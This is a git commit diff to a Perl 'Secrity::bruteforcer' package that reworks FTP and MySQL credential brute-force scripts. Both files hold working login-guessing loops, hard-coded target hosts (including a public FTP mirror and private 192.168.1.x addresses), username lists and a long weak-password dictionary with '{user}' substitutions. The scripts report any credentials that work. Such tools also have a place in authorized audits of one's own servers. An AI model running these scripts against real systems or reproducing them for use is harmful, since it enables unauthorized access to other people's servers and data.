96977289dc09a1e6442e70dd82731c7fdca3a375
Orange <bollwarm@tom.com>
2017-02-23 15:06:25 +0800

    fix some bugs

--- lib/Secrity/bruteforcer/ftp.pm
+++ lib/Secrity/bruteforcer/ftp.pm
@@ -17,63 +17,79 @@ Version 0.01
 
 our $VERSION = '0.01';
 
-my $DEBUG=0; 
+my $DEBUG = 0;
 
-my @hosts=qw(
+my @hosts = qw(
 
-ftp.jaist.ac.jp
-192.168.1.1
-192.168.1.2
-192.168.1.3
-192.168.1.4
-192.168.1.5
-192.168.1.6
+  ftp.jaist.ac.jp
+  192.168.1.1
+  192.168.1.2
+  192.168.1.3
+  192.168.1.4
+  192.168.1.5
+  192.168.1.6
 );
 
-my @usrs = ('ftp','www','admin','root','db','wwwroot','data','web','media');
-my @pws = ('123456','admin','root','ftp','password','123123','123','1','{user}','{user}{user}','{user}1','{user}123','{user}2016','{user}!@#','{user}2015','{user}!','','P@ssw0rd!!','qwa123','12345678','test','123qwe!@#','123456789','123321','1314520','666666','woaini','fuckyou','000000','1234567890','8888888','qwerty','1qaz2wsx','abc123','abc123456','1q2w3e4r','123qwe','159357','p@ssw0rd','p@55w0rd','password!','p@ssw0rd!','password1','r00t','tomcat','apache','system');
+my @usrs =
+  ( 'ftp', 'www', 'admin', 'root', 'db', 'wwwroot', 'data', 'web', 'media' );
+my @pws = (
+    '123456',     'admin',        'root',       'ftp',
+    'password',   '123123',       '123',        '1',
+    '{user}',     '{user}{user}', '{user}1',    '{user}123',
+    '{user}2016', '{user}!@#',    '{user}2015', '{user}!',
+    '',           'P@ssw0rd!!',   'qwa123',     '12345678',
+    'test',       '123qwe!@#',    '123456789',  '123321',
+    '1314520',    '666666',       'woaini',     'fuckyou',
+    '000000',     '1234567890',   '8888888',    'qwerty',
+    '1qaz2wsx',   'abc123',       'abc123456',  '1q2w3e4r',
+    '123qwe',     '159357',       'p@ssw0rd',   'p@55w0rd',
+    'password!',  'p@ssw0rd!',    'password1',  'r00t',
+    'tomcat',     'apache',       'system'
+);
 
-for(@hosts) {
+for (@hosts) {
 
-my $re=ftp($_);
+    my $re = ftp($_);
 
-if($re){
-print $_,": Anonymous opened! \n" if $re=~/ftp/;
-print $_,": Weak user and password :$re ! \n";
+    if ($re) {
+        print $_, ": Anonymous opened! \n" if $re =~ /ftp/;
+        print $_, ": Weak user and password :$re ! \n";
 
-}
+    }
 }
 
 sub ftp {
 
-use Net::FTP;
-my ($host)=@_;
-print "Sclar for $_ : \n";
+    use Net::FTP;
+    my ($host) = @_;
+    print "Sclar for $_ : \n";
 
-my $ftp = Net::FTP->new("$host", Debug =>$DEBUG,Timeout=>5) or  warn "Can't connect to $host: $@\n";
-return unless $ftp;
-my $result;
+    my $ftp = Net::FTP->new( "$host", Debug => $DEBUG, Timeout => 5 )
+      or warn "Can't connect to $host: $@\n";
+    return unless $ftp;
+    my $result;
 
-for(@usrs) {
-my $user=$_;
-for(@pws) {
-my $pwd=$_;
-$pwd=~s/\{user\}/$user/g if /\{user\}/;
-unless($ftp->stat){
- #$ftp->quit;
- $ftp = Net::FTP->new("$host", Debug =>$DEBUG)
-or print "Can't connect to $host: $@\n";
-}
-if( $ftp->login($user,$pwd)) {
-$result.= "$user $pwd";
-$ftp->quit;
-last;
-}
-print "Can't login ", $ftp->message,"\n" if $DEBUG;
-}
-}
-$ftp->quit;
-return $result;
+    for (@usrs) {
+        my $user = $_;
+        for (@pws) {
+            my $pwd = $_;
+            $pwd =~ s/\{user\}/$user/g if /\{user\}/;
+            unless ( $ftp->stat ) {
+
+                #$ftp->quit;
+                $ftp = Net::FTP->new( "$host", Debug => $DEBUG )
+                  or print "Can't connect to $host: $@\n";
+            }
+            if ( $ftp->login( $user, $pwd ) ) {
+                $result .= "$user $pwd";
+                $ftp->quit;
+                last;
+            }
+            print "Can't login ", $ftp->message, "\n" if $DEBUG;
+        }
+    }
+    $ftp->quit;
+    return $result;
 
 }
 
--- lib/Secrity/bruteforcer/mysql.pm
+++ lib/Secrity/bruteforcer/mysql.pm
@@ -1,78 +1,77 @@
-package Secrity::bruteforcer::mysql;
-
-use 5.006;
-use IO::Socket;
-use strict;
-use warnings;
 
 use lib ".";
 use BMYSQL;
-
-=head1 NAME
-
-Secrity::bruteforcer::ftp - The great new Secrity::bruteforcer::ftp!
-
-=head1 VERSION
-
-Version 0.01
-
-=cut
-
+use strict;
+use Data::Dumper;
 our $VERSION = '0.01';
 
-my $DEBUG=0; 
+my $DEBUG = 0;
 
-my @hosts=qw(
-
-192.168.1.1
-192.168.1.2
-192.168.1.3
-192.168.1.4
-192.168.1.5
-192.168.1.6
+my @hosts = qw(
+  192.168.1.1
+  192.168.1.2
+  192.168.1.3
+  192.168.1.4
+  192.168.1.5
+  192.168.1.6
 );
 
-my @usrs = ('root','ftp','www','admin','root','db','wwwroot','data','web','media');
-my @pws = ('123456','admin','root','toor','toor!@#','ftp','password','123123','123','1','{user}','{user}{user}','{user}1','{user}123','{user}2016','{user}!@#','{user}2015','{user}!','','P@ssw0rd!!','qwa123','12345678','test','123qwe!@#','123456789','123321','1314520','666666','woaini','fuckyou','000000','1234567890','8888888','qwerty','1qaz2wsx','abc123','abc123456','1q2w3e4r','123qwe','159357','p@ssw0rd','p@55w0rd','password!','p@ssw0rd!','password1','r00t','tomcat','apache','system'); 
+my @usrs = ( 'root', 'test', 'mysql' );
+my @pws = (
+    '123456',    'admin',      'root',         'toor!@#',
+    'ftp',       'password',   '123123',       '123',
+    '1',         '{user}',     '{user}{user}', '{user}1',
+    '{user}123', '{user}2016', '{user}!@#',    '{user}2015',
+    '{user}!',   '',           'P@ssw0rd!!',   'qwa123',
+    '12345678',  'test',       '123qwe!@#',    '123456789',
+    '123321',    '1314520',    '666666',       'woaini',
+    'fuckyou',   '000000',     '1234567890',   '8888888',
+    'qwerty',    '1qaz2wsx',   'abc123',       'abc123456',
+    '1q2w3e4r',  '123qwe',     '159357',       'p@ssw0rd',
+    'p@55w0rd',  'password!',  'p@ssw0rd!',    'password1',
+    'r00t',      'tomcat',     'apache',       'system'
+);
 
-for(@hosts) {
+for (@hosts) {
 
-my $re=mysql($_);
+    #print "Connet to $_ =====================:\n";
+    my $re = mysql($_);
 
-if($re){
+    if ($re) {
 
-print $_,": Weak user password :$re ! \n";
+        print $_, ":Find Mysql Weak user password :$re";
 
-}
+    }
 }
 
 sub mysql {
 
-my ($host)=@_;
-my $result;
+    my ($host) = @_;
+    my $result;
 
-for(@usrs) {
-my $user=$_;
-for(@pws) {
-my $pwd=$_;
-$pwd=~s/\{user\}/$user/g if /\{user\}/;
+    for (@usrs) {
+        my $user = $_;
+        for (@pws) {
+            my $pwd = $_;
+            $pwd =~ s/\{user\}/$user/g if /\{user\}/;
 
-my $DEBUG=1;
-my $mysql = BMYSQL->new(
-    hostname => $host,   # Default use UNIX socket
-    user     => $user,
-    password => $pwd,
-    debug   =>  $DEBUG,
-) or warn "Can't connect to $host: $@\n";
+            my $bmysql = BMYSQL->new(
+                hostname => $host,
+                debug    => $DEBUG,
+            ) or return;
 
-if( $mysql) {
-print $_ ," => ",$mysql->{$_},"\n"  for(keys %{$mysql});
-$result.= $mysql->{'user'}." ".$mysql->{'password'};
-$mysql->close();
-last;
-}
-
-}
-}
-return $result;
+            $bmysql->login( $user, $pwd );
+            if ( $bmysql->get_succect ) {
+                if ($DEBUG) {
+                    print "succect!\n";
+                    print $_ , " => ", $bmysql->{$_}, "\n"
+                      for ( keys %{$bmysql} );
+                }
+                $result .=
+                  $bmysql->{'user'} . " " . $bmysql->{'password'} . "\n";
+                last;
+            }
+        }
+    }
+    return $result;
 }
